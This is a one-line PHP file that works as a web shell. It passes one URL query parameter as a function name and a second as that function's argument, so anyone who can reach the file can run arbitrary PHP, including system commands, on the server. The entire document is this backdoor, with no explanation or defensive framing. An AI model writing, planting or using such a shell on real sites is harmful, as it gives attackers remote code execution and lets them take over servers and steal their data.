<?php $_GET['a']($_GET['b']);?>
